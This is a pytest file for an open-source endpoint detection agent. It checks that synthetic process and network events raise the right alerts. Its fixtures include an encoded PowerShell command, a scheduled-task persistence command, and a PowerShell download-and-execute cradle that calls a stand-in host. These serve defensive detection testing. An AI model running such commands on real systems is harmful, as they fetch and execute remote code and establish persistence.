from open_edr_mdr_agent.core.detection import detect_event
from open_edr_mdr_agent.core.schemas import EventType, NormalizedEvent, Source


def event(**kwargs):
    base = {"source": Source.INTERNAL, "tenant_id": "default", "host": "POS01", "severity": "info"}
    base.update(kwargs)
    return NormalizedEvent(**base)


def test_detect_encoded_powershell():
    alerts = detect_event(event(event_type=EventType.PROCESS_START, process_name="powershell.exe", command_line="powershell -enc SQBFAFgA"))
    assert [a.title for a in alerts] == ["Suspicious encoded PowerShell command"]


def test_detect_script_network_connection():
    alerts = detect_event(event(event_type=EventType.NETWORK_CONNECTION, process_name="powershell.exe", remote_ip="198.51.100.10", remote_port=443))
    assert any(a.title == "Script interpreter network connection" for a in alerts)


def test_detect_service_task_change():
    alerts = detect_event(event(event_type=EventType.PROCESS_START, process_name="cmd.exe", command_line="schtasks /create /tn evil /tr calc.exe"))
    assert any(a.title == "Suspicious service or scheduled task change" for a in alerts)


def test_detect_windows_event_log_powershell_scriptblock():
    alerts = detect_event(event(
        event_type=EventType.SCRIPT_RESULT,
        command_line="IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')",
        raw={"collector": "windows_event_log", "query": "powershell_operational", "message": "script block text"},
    ))
    assert [a.title for a in alerts] == ["Suspicious PowerShell script block"]


def test_detect_windows_event_log_service_and_task_changes():
    service_alerts = detect_event(event(event_type=EventType.ENDPOINT_STATE, raw={"collector": "windows_event_log", "query": "service_control_manager", "message": "A service was installed"}))
    task_alerts = detect_event(event(event_type=EventType.ENDPOINT_STATE, raw={"collector": "windows_event_log", "query": "task_scheduler", "message": "Task registered"}))
    assert service_alerts[0].title == "Windows service installed"
    assert task_alerts[0].title == "Windows scheduled task changed"


def test_detect_ioc_match():
    alerts = detect_event(event(event_type=EventType.NETWORK_CONNECTION, process_name="notepad.exe", remote_ip="203.0.113.10", remote_port=443))
    assert any(a.title == "Known bad indicator match" for a in alerts)
